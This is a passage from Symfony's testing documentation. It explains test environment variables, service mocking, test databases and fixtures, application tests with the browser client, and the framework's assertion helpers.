'debug'       => false,\n    ]);\n\n.. tip::\n\n    It is recommended to run your test with ``debug`` set to ``false`` on\n    your CI server, as it significantly improves test performance. This\n    disables clearing the cache. If your tests don't run in a clean\n    environment each time, you have to manually clear it using for instance\n    this code in ``tests/bootstrap.php``::\n\n        // ...\n\n        // ensure a fresh cache when debug mode is disabled\n        (new \\Symfony\\Component\\Filesystem\\Filesystem())->remove(__DIR__.'/../var/cache/test');\n\nCustomizing Environment Variables\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf you need to customize some environment variables for your tests (e.g. the\n``DATABASE_URL`` used by Doctrine), you can do that by overriding anything you\nneed in your ``.env.test`` file:\n\n.. code-block:: env\n\n    # .env.test\n\n    # ...\n    DATABASE_URL=\"mysql://db_user:db_password@127.0.0.1:3306/db_name_test?serverVersion=8.0.37\"\n\nIn the test environment, these env files are read (if vars are duplicated\nin them, files lower in the list override previous items):\n\n#. ``.env``: containing env vars with application defaults;\n#. ``.env.test``: overriding/setting specific test values or vars;\n#. ``.env.test.local``: overriding settings specific for this machine.\n\n.. warning::\n\n    The ``.env.local`` file is **not** used in the test environment, to\n    make each test set-up as consistent as possible.\n\nRetrieving Services in the Test\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIn your integration tests, you often need to fetch the service from the\nservice container to call a specific method. After booting the kernel,\nthe container is returned by ``static::getContainer()``::\n\n    // tests/Service/NewsletterGeneratorTest.php\n    namespace App\\Tests\\Service;\n\n    use App\\Service\\NewsletterGenerator;\n    use Symfony\\Bundle\\FrameworkBundle\\Test\\KernelTestCase;\n\n    class NewsletterGeneratorTest extends KernelTestCase\n    {\n        public function testSomething(): void\n        {\n            // (1) boot the Symfony kernel\n            self::bootKernel();\n\n            // (2) use static::getContainer() to access the service container\n            $container = static::getContainer();\n\n            // (3) run some service & test the result\n            $newsletterGenerator = $container->get(NewsletterGenerator::class);\n            $newsletter = $newsletterGenerator->generateMonthlyNews(/* ... */);\n\n            $this->assertEquals('...', $newsletter->getContent());\n        }\n    }\n\nThe container from ``static::getContainer()`` is actually a special test container.\nIt gives you access to both the public services and the non-removed\n:ref:`private services <container-public>`.\n\n.. note::\n\n    If you need to test private services that have been removed (those who\n    are not used by any other services), you need to declare those private\n    services as public in the ``config/services_test.yaml`` file.\n\nMocking Dependencies\n--------------------\n\nSometimes it can be useful to mock a dependency of a tested service.\nFrom the example in the previous section, let's assume the\n``NewsletterGenerator`` has a dependency to a private alias\n``NewsRepositoryInterface`` pointing to a private ``NewsRepository`` service\nand you'd like to use a mocked ``NewsRepositoryInterface`` instead of the\nconcrete one::\n\n    // ...\n    use App\\Contracts\\Repository\\NewsRepositoryInterface;\n\n    class NewsletterGeneratorTest extends KernelTestCase\n    {\n        public function testSomething(): void\n        {\n            // ... same bootstrap as the section above\n\n            $newsRepository = $this->createMock(NewsRepositoryInterface::class);\n            $newsRepository->expects(self::once())\n                ->method('findNewsFromLastMonth')\n                ->willReturn([\n                    new News('some news'),\n                    new News('some other news'),\n                ])\n            ;\n\n            $container->set(NewsRepositoryInterface::class, $newsRepository);\n\n            // will be injected the mocked repository\n            $newsletterGenerator = $container->get(NewsletterGenerator::class);\n\n            // ...\n        }\n    }\n\nNo further configuration is required, as the test service container is a special one\nthat allows you to interact with private services and aliases.\n\n.. _testing-databases:\n\nConfiguring a Database for Tests\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nTests that interact with the database should use their own separate\ndatabase to not mess with the databases used in the other\n:ref:`configuration environments <configuration-environments>`.\n\nTo do that, edit or create the ``.env.test.local`` file at the root\ndirectory of your project and define the new value for the ``DATABASE_URL``\nenv var:\n\n.. code-block:: env\n\n    # .env.test.local\n    DATABASE_URL=\"mysql://USERNAME:PASSWORD@127.0.0.1:3306/DB_NAME?serverVersion=8.0.37\"\n\nThis assumes that each developer/machine uses a different database for the\ntests. If the test set-up is the same on each machine, use the ``.env.test``\nfile instead and commit it to the shared repository. Learn more about\n:ref:`using multiple .env files in Symfony applications <configuration-multiple-env-files>`.\n\nAfter that, you can create the test database and all tables using:\n\n.. code-block:: terminal\n\n    # create the test database\n    $ php bin/console --env=test doctrine:database:create\n\n    # create the tables/columns in the test database\n    $ php bin/console --env=test doctrine:schema:create\n\n.. tip::\n\n    You can run these commands to create the database during the\n    :doc:`test bootstrap process <testing/bootstrap>`.\n\n.. tip::\n\n    A common practice is to append the ``_test`` suffix to the original\n    database names in tests. If the database name in production is called\n    ``project_acme`` the name of the testing database could be\n    ``project_acme_test``.\n\nResetting the Database Automatically Before each Test\n.....................................................\n\nTests should be independent from each other to avoid side effects. For\nexample, if some test modifies the database (by adding or removing an\nentity) it could change the results of other tests.\n\nThe `DAMADoctrineTestBundle`_ uses Doctrine transactions to let each test\ninteract with an unmodified database. Install it using:\n\n.. code-block:: terminal\n\n    $ composer require --dev dama/doctrine-test-bundle\n\nNow, enable it as a PHPUnit extension:\n\n.. code-block:: xml\n\n    <!-- phpunit.xml.dist -->\n    <phpunit>\n        <!-- ... -->\n\n        <extensions>\n            <extension class=\"DAMA\\DoctrineTestBundle\\PHPUnit\\PHPUnitExtension\"/>\n        </extensions>\n    </phpunit>\n\nThat's it! This bundle uses a clever trick: it begins a database\ntransaction before every test and rolls it back automatically after the\ntest finishes to undo all changes. Read more in the documentation of the\n`DAMADoctrineTestBundle`_.\n\n.. _doctrine-fixtures:\n\nLoad Dummy Data Fixtures\n........................\n\nInstead of using the real data from the production database, it's common to\nuse fake or dummy data in the test database. This is usually called\n*\"fixtures data\"* and Doctrine provides a library to create and load them.\nInstall it with:\n\n.. code-block:: terminal\n\n    $ composer require --dev doctrine/doctrine-fixtures-bundle\n\nThen, use the ``make:fixtures`` command of the `SymfonyMakerBundle`_ to\ngenerate an empty fixture class:\n\n.. code-block:: terminal\n\n    $ php bin/console make:fixtures\n\n    The class name of the fixtures to create (e.g. AppFixtures):\n    > ProductFixture\n\nThen you modify and use this class to load new entities in the database. For\ninstance, to load ``Product`` objects into Doctrine, use::\n\n    // src/DataFixtures/ProductFixture.php\n    namespace App\\DataFixtures;\n\n    use App\\Entity\\Product;\n    use Doctrine\\Bundle\\FixturesBundle\\Fixture;\n    use Doctrine\\Persistence\\ObjectManager;\n\n    class ProductFixture extends Fixture\n    {\n        public function load(ObjectManager $manager): void\n        {\n            $product = new Product();\n            $product->setName('Priceless widget');\n            $product->setPrice(14.50);\n            $product->setDescription('Ok, I guess it *does* have a price');\n            $manager->persist($product);\n\n            // add more products\n\n            $manager->flush();\n        }\n    }\n\nEmpty the database and reload *all* the fixture classes with:\n\n.. code-block:: terminal\n\n    $ php bin/console --env=test doctrine:fixtures:load\n\nFor more information, read the `DoctrineFixturesBundle documentation`_.\n\n.. _functional-tests:\n\nApplication Tests\n-----------------\n\nApplication tests check the integration of all the different layers of the\napplication (from the routing to the views). They are no different from\nunit tests or integration tests as far as PHPUnit is concerned, but they\nhave a very specific workflow:\n\n#. :ref:`Make a request <testing-applications-arrange>`;\n#. :ref:`Interact with the page <testing-applications-act>` (e.g. click on a link or submit a form);\n#. :ref:`Test the response <testing-application-assertions>`;\n#. Rinse and repeat.\n\n.. note::\n\n    The tools used in this section can be installed via the ``symfony/test-pack``,\n    use ``composer require symfony/test-pack`` if you haven't done so already.\n\nWrite Your First Application Test\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nApplication tests are PHP files that typically live in the ``tests/Controller/``\ndirectory of your application. They often extend\n:class:`Symfony\\\\Bundle\\\\FrameworkBundle\\\\Test\\\\WebTestCase`. This class\nadds special logic on top of the ``KernelTestCase``. You can read more\nabout that in the above :ref:`section on integration tests <integration-tests>`.\n\nIf you want to test the pages handled by your\n``PostController`` class, start by creating a new ``PostControllerTest``\nusing the ``make:test`` command of the `SymfonyMakerBundle`_:\n\n.. code-block:: terminal\n\n    $ php bin/console make:test\n\n     Which test type would you like?:\n     > WebTestCase\n\n     The name of the test class (e.g. BlogPostTest):\n     > Controller\\PostControllerTest\n\nThis creates the following test class::\n\n    // tests/Controller/PostControllerTest.php\n    namespace App\\Tests\\Controller;\n\n    use Symfony\\Bundle\\FrameworkBundle\\Test\\WebTestCase;\n\n    class PostControllerTest extends WebTestCase\n    {\n        public function testSomething(): void\n        {\n            // This calls KernelTestCase::bootKernel(), and creates a\n            // \"client\" that is acting as the browser\n            $client = static::createClient();\n\n            // Request a specific page\n            $crawler = $client->request('GET', '/');\n\n            // Validate a successful response and some content\n            $this->assertResponseIsSuccessful();\n            $this->assertSelectorTextContains('h1', 'Hello World');\n        }\n    }\n\nIn the above example, the test validates that the HTTP response was successful\nand the request body contains a ``<h1>`` tag with ``\"Hello world\"``.\n\nThe ``request()`` method also returns a crawler, which you can use to\ncreate more complex assertions in your tests (e.g. to count the number of page\nelements that match a given CSS selector)::\n\n    $crawler = $client->request('GET', '/post/hello-world');\n    $this->assertCount(4, $crawler->filter('.comment'));\n\nYou can learn more about the crawler in :doc:`/testing/dom_crawler`.\n\n.. _testing-applications-arrange:\n\nMaking Requests\n~~~~~~~~~~~~~~~\n\nThe test client simulates an HTTP client like a browser and makes requests\ninto your Symfony application::\n\n    $crawler = $client->request('GET', '/post/hello-world');\n\nThe :method:`request() <Symfony\\\\Component\\\\BrowserKit\\\\AbstractBrowser::request>` method takes the HTTP method and a URL as arguments and\nreturns a ``Crawler`` instance.\n\n.. tip::\n\n    Hardcoding the request URLs is a best practice for application tests.\n    If the test generates URLs using the Symfony router, it won't detect\n    any change made to the application URLs which may impact the end users.\n\nThe full signature of the ``request()`` method is::\n\n    public function request(\n        string $method,\n        string $uri,\n        array $parameters = [],\n        array $files = [],\n        array $server = [],\n        ?string $content = null,\n        bool $changeHistory = true\n    ): Crawler\n\nThis allows you to create all types of requests you can think of:\n\n.. tip::\n\n    The test client is available as the ``test.client`` service in the\n    container in the ``test`` environment (or wherever the\n    :ref:`framework.test <reference-framework-test>` option is enabled).\n    This means you can override the service entirely if you need to.\n\nMultiple Requests in One Test\n.............................\n\nAfter making a request, subsequent requests will make the client reboot the kernel.\nThis recreates the container from scratch to ensures that requests are isolated\nand use new service objects each time. This behavior can have some unexpected\nconsequences: for example, the security token will be cleared, Doctrine entities\nwill be detached, etc.\n\nFirst, you can call the client's :method:`Symfony\\\\Bundle\\\\FrameworkBundle\\\\KernelBrowser::disableReboot`\nmethod to reset the kernel instead of rebooting it. In practice, Symfony\nwill call the ``reset()`` method of every service tagged with ``kernel.reset``.\nHowever, this will **also** clear the security token, detach Doctrine entities, etc.\n\nIn order to solve this issue, create a :doc:`compiler pass </service_container/compiler_passes>`\nto remove the ``kernel.reset`` tag from some services in your test environment::\n\n    // src/Kernel.php\n    namespace App;\n\n    use Symfony\\Bundle\\FrameworkBundle\\Kernel\\MicroKernelTrait;\n    use Symfony\\Component\\DependencyInjection\\Compiler\\CompilerPassInterface;\n    use Symfony\\Component\\DependencyInjection\\ContainerBuilder;\n    use Symfony\\Component\\HttpKernel\\Kernel as BaseKernel;\n\n    class Kernel extends BaseKernel implements CompilerPassInterface\n    {\n        use MicroKernelTrait;\n\n        // ...\n\n        public function process(ContainerBuilder $container): void\n        {\n            if ('test' === $this->environment) {\n                // prevents the security token to be cleared\n                $container->getDefinition('security.token_storage')->clearTag('kernel.reset');\n\n                // prevents Doctrine entities to be detached\n                $container->getDefinition('doctrine')->clearTag('kernel.reset');\n\n                // ...\n            }\n        }\n    }\n\nBrowsing the Site\n.................\n\nThe Client supports many operations that can be done in a real browser::\n\n    $client->back();\n    $client->forward();\n    $client->reload();\n\n    // clears all cookies and the history\n    $client->restart();\n\n.. note::\n\n    The ``back()`` and ``forward()`` methods skip the redirects that may have\n    occurred when requesting a URL, as normal browsers do.\n\nRedirecting\n...........\n\nWhen a request returns a redirect response, the client does not follow\nit automatically. You can examine the response and force a redirection\nafterwards with the ``followRedirect()`` method::\n\n    $crawler = $client->followRedirect();\n\nIf you want the client to automatically follow all redirects, you can\nforce them by calling the ``followRedirects()`` method before performing the request::\n\n    $client->followRedirects();\n\nIf you pass ``false`` to the ``followRedirects()`` method, the redirects\nwill no longer be followed::\n\n    $client->followRedirects(false);\n\n.. _testing_logging_in_users:\n\nLogging in Users (Authentication)\n.................................\n\nWhen you want to add application tests for protected pages, you have to\nfirst \"login\" as a user. Reproducing the actual steps - such as\nsubmitting a login form - makes a test very slow. For this reason, Symfony\nprovides a ``loginUser()`` method to simulate logging in your functional\ntests.\n\nInstead of logging in with real users, it's recommended to create a user\nonly for tests. You can do that with `Doctrine data fixtures`_ to load the\ntesting users only in the test database.\n\nAfter loading users in your database, use your user repository to fetch\nthis user and use\n:method:`$client->loginUser() <Symfony\\\\Bundle\\\\FrameworkBundle\\\\KernelBrowser::loginUser>`\nto simulate a login request::\n\n    // tests/Controller/ProfileControllerTest.php\n    namespace App\\Tests\\Controller;\n\n    use App\\Repository\\UserRepository;\n    use Symfony\\Bundle\\FrameworkBundle\\Test\\WebTestCase;\n\n    class ProfileControllerTest extends WebTestCase\n    {\n        // ...\n\n        public function testVisitingWhileLoggedIn(): void\n        {\n            $client = static::createClient();\n            $userRepository = static::getContainer()->get(UserRepository::class);\n\n            // retrieve the test user\n            $testUser = $userRepository->findOneByEmail('john.doe@example.com');\n\n            // simulate $testUser being logged in\n            $client->loginUser($testUser);\n\n            // test e.g. the profile page\n            $client->request('GET', '/profile');\n            $this->assertResponseIsSuccessful();\n            $this->assertSelectorTextContains('h1', 'Hello John!');\n        }\n    }\n\nYou can pass any\n:class:`Symfony\\\\Component\\\\Security\\\\Core\\\\User\\\\UserInterface` instance to\n``loginUser()``. This method creates a special\n:class:`Symfony\\\\Bundle\\\\FrameworkBundle\\\\Test\\\\TestBrowserToken` object and\nstores in the session of the test client. If you need to define custom\nattributes in this token, you can use the ``tokenAttributes`` argument of the\n:method:`Symfony\\\\Bundle\\\\FrameworkBundle\\\\KernelBrowser::loginUser` method.\n\nTo set a specific firewall (``main`` is set by default)::\n\n    $client->loginUser($testUser, 'my_firewall');\n\n.. note::\n\n    By design, the ``loginUser()`` method doesn't work when using stateless firewalls.\n    Instead, add the appropriate token/header in each ``request()`` call.\n\nMaking AJAX Requests\n....................\n\nThe client provides an\n:method:`Symfony\\\\Component\\\\BrowserKit\\\\AbstractBrowser::xmlHttpRequest`\nmethod, which has the same arguments as the ``request()`` method and is\na shortcut to make AJAX requests::\n\n    // the required HTTP_X_REQUESTED_WITH header is added automatically\n    $client->xmlHttpRequest('POST', '/submit', ['name' => 'Fabien']);\n\nSending Custom Headers\n......................\n\nIf your application behaves according to some HTTP headers, pass them as the\nsecond argument of ``createClient()``::\n\n    $client = static::createClient([], [\n        'HTTP_HOST'       => 'en.example.com',\n        'HTTP_USER_AGENT' => 'MySuperBrowser/1.0',\n    ]);\n\nYou can also override HTTP headers on a per request basis::\n\n    $client->request('GET', '/', [], [], [\n        'HTTP_HOST'       => 'en.example.com',\n        'HTTP_USER_AGENT' => 'MySuperBrowser/1.0',\n    ]);\n\n.. warning::\n\n    The name of your custom headers must follow the syntax defined in the\n    `section 4.1.18 of RFC 3875`_: replace ``-`` by ``_``, transform it into\n    uppercase and prefix the result with ``HTTP_``. For example, if your\n    header name is ``X-Session-Token``, pass ``HTTP_X_SESSION_TOKEN``.\n\nReporting Exceptions\n....................\n\nDebugging exceptions in application tests may be difficult because by default\nthey are caught and you need to look at the logs to see which exception was\nthrown. Disabling catching of exceptions in the test client allows the exception\nto be reported by PHPUnit::\n\n    $client->catchExceptions(false);\n\nAccessing Internal Objects\n..........................\n\nIf you use the client to test your application, you might want to access the\nclient's internal objects::\n\n    $history = $client->getHistory();\n    $cookieJar = $client->getCookieJar();\n\nYou can also get the objects related to the latest request::\n\n    // the HttpKernel request instance\n    $request = $client->getRequest();\n\n    // the BrowserKit request instance\n    $request = $client->getInternalRequest();\n\n    // the HttpKernel response instance\n    $response = $client->getResponse();\n\n    // the BrowserKit response instance\n    $response = $client->getInternalResponse();\n\n    // the Crawler instance\n    $crawler = $client->getCrawler();\n\nAccessing the Profiler Data\n...........................\n\nOn each request, you can enable the Symfony profiler to collect data about the\ninternal handling of that request. For example, the profiler could be used to\nverify that a given page runs less than a certain number of database\nqueries when loading.\n\nTo get the profiler for the last request, do the following::\n\n    // enables the profiler for the very next request\n    $client->enableProfiler();\n\n    $crawler = $client->request('GET', '/profiler');\n\n    // gets the profile\n    $profile = $client->getProfile();\n\nFor specific details on using the profiler inside a test, see the\n:doc:`/testing/profiling` article.\n\n.. _testing-applications-act:\n\nInteracting with the Response\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nLike a real browser, the Client and Crawler objects can be used to interact\nwith the page you're served:\n\n.. _testing-links:\n\nClicking on Links\n.................\n\nUse the ``clickLink()`` method to click on the first link that contains the\ngiven text (or the first clickable image with that ``alt`` attribute)::\n\n    $client = static::createClient();\n    $client->request('GET', '/post/hello-world');\n\n    $client->clickLink('Click here');\n\nIf you need access to the :class:`Symfony\\\\Component\\\\DomCrawler\\\\Link` object\nthat provides helpful methods specific to links (such as ``getMethod()`` and\n``getUri()``), use the ``Crawler::selectLink()`` method instead::\n\n    $client = static::createClient();\n    $crawler = $client->request('GET', '/post/hello-world');\n\n    $link = $crawler->selectLink('Click here')->link();\n    // ...\n\n    // use click() if you want to click the selected link\n    $client->click($link);\n\n.. _testing-forms:\n\nSubmitting Forms\n................\n\nUse the ``submitForm()`` method to submit the form that contains the given button::\n\n    $client = static::createClient();\n    $client->request('GET', '/post/hello-world');\n\n    $crawler = $client->submitForm('Add comment', [\n        'comment_form[content]' => '...',\n    ]);\n\nThe first argument of ``submitForm()`` is the text content, ``id``, ``value`` or\n``name`` of any ``<button>`` or ``<input type=\"submit\">`` included in the form.\nThe second optional argument is used to override the default form field values.\n\n.. note::\n\n    Notice that you select form buttons and not forms, as a form can have several\n    buttons. If you use the traversing API, keep in mind that you must look for a\n    button.\n\nIf you need access to the :class:`Symfony\\\\Component\\\\DomCrawler\\\\Form` object\nthat provides helpful methods specific to forms (such as ``getUri()``,\n``getValues()`` and ``getFiles()``) use the ``Crawler::selectButton()`` method instead::\n\n    $client = static::createClient();\n    $crawler = $client->request('GET', '/post/hello-world');\n\n    // select the button\n    $buttonCrawlerNode = $crawler->selectButton('submit');\n\n    // retrieve the Form object for the form belonging to this button\n    $form = $buttonCrawlerNode->form();\n\n    // set values on a form object\n    $form['my_form[name]'] = 'Fabien';\n    $form['my_form[subject]'] = 'Symfony rocks!';\n\n    // submit the Form object\n    $client->submit($form);\n\n    // optionally, you can combine the last 2 steps by passing an array of\n    // field values while submitting the form:\n    $client->submit($form, [\n        'my_form[name]'    => 'Fabien',\n        'my_form[subject]' => 'Symfony rocks!',\n    ]);\n\nBased on the form type, you can use different methods to fill in the\ninput::\n\n    // selects an option or a radio\n    $form['my_form[country]']->select('France');\n\n    // ticks a checkbox\n    $form['my_form[like_symfony]']->tick();\n\n    // uploads a file\n    $form['my_form[photo]']->upload('/path/to/lucas.jpg');\n\n    // In the case of a multiple file upload\n    $form['my_form[field][0]']->upload('/path/to/lucas.jpg');\n    $form['my_form[field][1]']->upload('/path/to/lisa.jpg');\n\n.. tip::\n\n    Instead of hardcoding the form name as part of the field names (e.g.\n    ``my_form[...]`` in previous examples), you can use the\n    :method:`Symfony\\\\Component\\\\DomCrawler\\\\Form::getName` method to get the\n    form name.\n\n.. tip::\n\n    If you purposefully want to select \"invalid\" select/radio values, see\n    :ref:`components-dom-crawler-invalid`.\n\n.. tip::\n\n    You can get the values that will be submitted by calling the ``getValues()``\n    method on the ``Form`` object. The uploaded files are available in a\n    separate array returned by ``getFiles()``. The ``getPhpValues()`` and\n    ``getPhpFiles()`` methods also return the submitted values, but in the\n    PHP format (it converts the keys with square brackets notation - e.g.\n    ``my_form[subject]`` - to PHP arrays).\n\n.. tip::\n\n    The ``submit()`` and ``submitForm()`` methods define optional arguments to\n    add custom server parameters and HTTP headers when submitting the form::\n\n        $client->submit($form, [], ['HTTP_ACCEPT_LANGUAGE' => 'es']);\n        $client->submitForm($button, [], 'POST', ['HTTP_ACCEPT_LANGUAGE' => 'es']);\n\n.. _testing-application-assertions:\n\nTesting the Response (Assertions)\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nNow that the tests have visited a page and interacted with it (e.g. filled\nin a form), it is time to verify that the expected output is shown.\n\nAs all tests are based on PHPUnit, you can use any `PHPUnit Assertion`_ in\nyour tests. Combined with test Client and the Crawler, this allows you to\ncheck anything you want.\n\nHowever, Symfony provides useful shortcut methods for the most common cases:\n\nResponse Assertions\n...................\n\n``assertResponseIsSuccessful(string $message = '', bool $verbose = true)``\n    Asserts that the response was successful (HTTP status is 2xx).\n``assertResponseStatusCodeSame(int $expectedCode, string $message = '', bool $verbose = true)``\n    Asserts a specific HTTP status code.\n``assertResponseRedirects(?string $expectedLocation = null, ?int $expectedCode = null, string $message = '', bool $verbose = true)``\n    Asserts the response is a redirect response (optionally, you can check\n    the target location and status code). The excepted location can be either\n    an absolute or a relative path.\n``assertResponseHasHeader(string $headerName, string $message = '')``/``assertResponseNotHasHeader(string $headerName, string $message = '')``\n    Asserts the given header is (not) available on the response, e.g. ``assertResponseHasHeader('content-type');``.\n``assertResponseHeaderSame(string $headerName, string $expectedValue, string $message = '')``/``assertResponseHeaderNotSame(string $headerName, string $expectedValue, string $message = '')``\n    Asserts the given header does (not) contain the expected value on the\n    response, e.g. ``assertResponseHeaderSame('content-type', 'application/octet-stream');``.\n``assertResponseHasCookie(string $name, string $path = '/', ?string $domain = null, string $message = '')``/``assertResponseNotHasCookie(string $name, string $path = '/', ?string $domain = null, string $message = '')``\n    Asserts the given cookie is present in the response (optionally\n    checking for a specific cookie path or domain).\n``assertResponseCookieValueSame(string $name, string $expectedValue, string $path = '/', ?string $domain = null, string $message = '')``\n    Asserts the given cookie is present and set to the expected value.\n``assertResponseFormatSame(?string $expectedFormat, string $message = '')``\n    Asserts the response format returned by the\n    :method:`Symfony\\\\Component\\\\HttpFoundation\\\\Response::getFormat` method\n    is the same as the expected value.\n``assertResponseIsUnprocessable(string $message = '', bool $verbose = true)``\n    Asserts the response is unprocessable (HTTP status is 422)\n\n.. versionadded:: 7.1\n\n    The ``$verbose`` parameters were introduced in Symfony 7.1.\n\nRequest Assertions\n..................\n\n``assertRequestAttributeValueSame(string $name, string $expectedValue, string $message = '')``\n    Asserts the given :ref:`request attribute <component-foundation-attributes>`\n    is set to the expected value.\n``assertRouteSame($expectedRoute, array $parameters = [], string $message = '')``\n    Asserts the request matches the given route and optionally route parameters.\n\nBrowser Assertions\n..................\n\n``assertBrowserHasCookie(string $name, string $path = '/', ?string $domain = null, string $message = '')``/``assertBrowserNotHasCookie(string $name, string $path = '/', ?string $domain = null, string $message = '')``\n    Asserts that the test Client does (not) have the given cookie set\n    (meaning, the cookie was set by any response in the test).\n``assertBrowserCookieValueSame(string $name, string $expectedValue, string $path = '/', ?string $domain = null, string $message = '')``\n    Asserts the given cookie in the test Client is set to the expected\n    value.\n``assertThatForClient(Constraint $constraint, string $message = '')``\n    Asserts the given Constraint in the Client. Useful for using your custom asserts\n    in the same way as built-in asserts (i.e. without passing the Client as argument)::\n\n        // add this method in some custom class imported in your tests\n        protected static function assertMyOwnCustomAssert(): void\n        {\n            self::assertThatForClient(new SomeCustomConstraint());\n        }\n\nCrawler Assertions\n..................\n\n``assertSelectorExists(string $selector, string $message = '')``/``assertSelectorNotExists(string $selector, string $message = '')``\n    Asserts that the given selector does (not) match at least one element\n    in the response.\n``assertSelectorCount(int $expectedCount, string $selector, string $message = '')``\n    Asserts that the expected number of selector elements are in the response\n``assertSelectorTextContains(string $selector, string $text, string $message = '')``/``assertSelectorTextNotContains(string $selector, string $text, string $message = '')``\n    Asserts that the first element matching the given selector does (not)\n    contain the expected text.\n``assertAnySelectorTextContains(string $selector, string $text, string $message = '')``/``assertAnySelectorTextNotContains(string $selector, string $text, string $message = '')``\n    Asserts that any element matching the given selector does (not)\n    contain the expected text.\n``assertSelectorTextSame(string $selector, string $text, string $message = '')``\n    Asserts that the contents of the first element matching the given\n    selector does equal the expected text.\n``assertAnySelectorTextSame(string $selector, string $text, string $message = '')``\n    Asserts that the any element matching the given selector does equal the\n    expected text.\n``assertPageTitleSame(string $expectedTitle, string $message = '')``\n    Asserts that the ``<title>`` element is equal to the given title.\n``assertPageTitleContains(string $expectedTitle, string $message = '')``\n    Asserts that the ``<title>`` element contains the given title.\n``assertInputValueSame(string $fieldName, string $expectedValue, string $message = '')``/``assertInputValueNotSame(string $fieldName, string $expectedValue, string $message = '')``\n    Asserts that value of the form input with the given name does (not)\n    equal the expected value.\n``assertCheckboxChecked(string $fieldName, string $message = '')``/``assertCheckboxNotChecked(string $fieldName, string $message = '')``\n    Asserts that the checkbox with the given name is (not) checked.\n``assertFormValue(string $formSelector, string $fieldName, string $value, string $message = '')``/``assertNoFormValue(string $formSelector, string $fieldName, string $message = '')``\n    Asserts that value of the field of the first form matching the given\n    selector does (not) equal the expected value.\n\n.. _mailer-assertions:\n\nMailer Assertions\n.................\n\n``assertEmailCount(int $count, ?string $transport = null, string $message = '')``\n    Asserts that the expected number of emails was sent.\n``assertQueuedEmailCount(int $count, ?string $transport = null, string $message = '')``\n    Asserts that the expected number of emails was queued (e.g. using the\n    Messenger component).\n``assertEmailIsQueued(MessageEvent $event, string $message = '')``/``assertEmailIsNotQueued(MessageEvent $event, string $message = '')``\n    Asserts that the given mailer event is (not) queued. Use\n    ``getMailerEvent(int $index = 0, ?string $transport = null)`` to\n    retrieve a mailer event by index.\n``assertEmailAttachmentCount(RawMessage $email, int $count, string $message = '')``\n    Asserts that the given email has the expected number of attachments. Use\n    ``getMailerMessage(int $index = 0, ?string $transport = null)`` to\n    retrieve a specific email by index.\n``assertEmailTextBodyContains(RawMessage $email, string $text, string $message = '')``/``assertEmailTextBodyNotContains(RawMessage $email, string $text, string $message = '')``\n    Asserts that the text body of the given email does (not) contain the\n    expected text.\n``assertEmailHtmlBodyContains(RawMessage $email, string $text, string $message = '')``/``assertEmailHtmlBodyNotContains(RawMessage $email, string $text, string $message = '')``\n    Asserts that the HTML body of the given email does (not) contain the\n    expected text.\n``assertEmailHasHeader(RawMessage $email, string $headerName, string $message = '')``/``assertEmailNotHasHeader(RawMessage $email, string $headerName, string $message = '')``\n    Asserts that the given email does (not) have the expected header set.\n``assertEmailHeaderSame(RawMessage $email, string $headerName, string $expectedValue, string $message = '')``/``assertEmailHeaderNotSame(RawMessage $email, string $headerName, string $expectedValue, string $message = '')``\n    Asserts that the given email does (not) have the expected header set to\n    the expected value.\n``assertEmailAddressContains(RawMessage $email, string $headerName, string $expectedValue, string $message = '')``\n    Asserts that the given address header equals the expected e-mail\n    address. This assertion normalizes addresses like ``Jane Smith\n    <jane@example.com>`` into ``jane@example.com``.\n``assertEmailSubjectContains(RawMessage $email, string $expectedValue, string $message = '')``/``assertEmailSubjectNotContains(RawMessage $email, string $expectedValue, string $message = '')``\n    Asserts that the subject of the given email does (not) contain the\n    expected subject.\n\nNotifier Assertions\n...................\n\n``assertNotificationCount(int $count, ?string $transportName = null, string $message = '')``\n    Asserts that the given number of notifications has been created\n    (in total or for the given transport).\n``assertQueuedNotificationCount(int $count, ?string $transportName = null, string $message = '')``\n    Asserts that the given number of notifications are queued\n    (in total or for the given transport).\n``assertNotificationIsQueued(MessageEvent $event, string $message = '')``\n    Asserts that the given notification is queued.\n``assertNotificationIsNotQueued(MessageEvent $event, string $message = '')``\n    Asserts that the given notification is not queued.\n``assertNotificationSubjectContains(MessageInterface $notification, string $text, string $message = '')``\n    Asserts that the given text is included in the subject of\n    the given notification.\n``assertNotificationSubjectNotContains(MessageInterface $notification, string $text, string $message = '')``\n    Asserts that the given text is not included in the subject of\n    the given notification.\n``assertNotificationTransportIsEqual(MessageInterface $notification, string $transportName, string $message = '')``\n    Asserts that the name of the transport for the given notification\n    is the same as the given text.\n``assertNotificationTransportIsNotEqual(MessageInterface $notification, string $transportName, string $message = '')``\n    Asserts that the name of the transport for the given notification\n    is not the same as the given text.\n\nHttpClient Assertions\n.....................\n\n.. tip::\n\n    For all the following assertions, ``$client->enableProfiler()`` must be\n    called before the code that will trigger HTTP request(s).\n\n``assertHttpClientRequest(string $expectedUrl, string $expectedMethod = 'GET', string|array|null $expectedBody = null, array $expectedHeaders = [], string $httpClientId = 'http_client')``\n    Asserts that the given URL has been called using, if specified,\n    the given method body and headers. By default it will check on the HttpClient,\n    but you can also pass a specific HttpClient ID.\n    (It will succeed if the request has been called multiple times.)\n\n``assertNotHttpClientRequest(string $unexpectedUrl, string $expectedMethod = 'GET', string $httpClientId = 'http_client')``\n    Asserts that the given URL has not been called using GET or the specified method.\n    By default it will check on the HttpClient, but a HttpClient id can be specified.\n\n``assertHttpClientRequestCount(int $count, string $httpClientId = 'http_client')``\n    Asserts that the given number of requests has been made on the HttpClient.\n    By default it will check on the HttpClient, but you can also pass a specific\n    HttpClient ID.\n\nEnd to End Tests (E2E)\n~~~~~~~~~~~~~~~~~~~~~~\n\nIf you need to test the application as a whole, including the JavaScript\ncode, you can use a real browser instead of the test client. This is\ncalled an end-to-end test and it's a great way to test the application.\n\nThis can be achieved thanks to the Panther component. You can learn more\nabout it in :doc:`the dedicated page </testing/end_to_end>`.\n\nLearn more\n----------\n\n.. toctree::\n    :maxdepth: 1\n    :glob:\n\n    testing/*\n    /components/dom_crawler\n    /components/css_selector\n\n.. _`PHPUnit`: https://phpunit.de/\n.. _`documentation`: https://docs.phpunit.de/\n.. _`Writing Tests for PHPUnit`: https://docs.phpunit.de/en/10.5/writing-tests-for-phpunit.html\n.. _`PHPUnit documentation`: 